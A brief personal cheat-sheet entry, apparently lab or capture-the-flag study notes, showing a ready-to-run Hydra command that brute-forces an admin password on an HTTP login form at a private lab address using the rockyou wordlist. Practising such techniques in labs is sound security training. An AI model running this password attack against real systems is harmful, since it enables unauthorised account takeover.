# HYDRA - brute forcing tool

### Brute forcing HTTP login

```bash
sudo hydra -l admin -P /usr/share/dict/rockyou.txt 10.129.1.15 http-post-form "/login.php:Username=admin&Submit=Login&Password=^PASS^:Incorrect information"
```
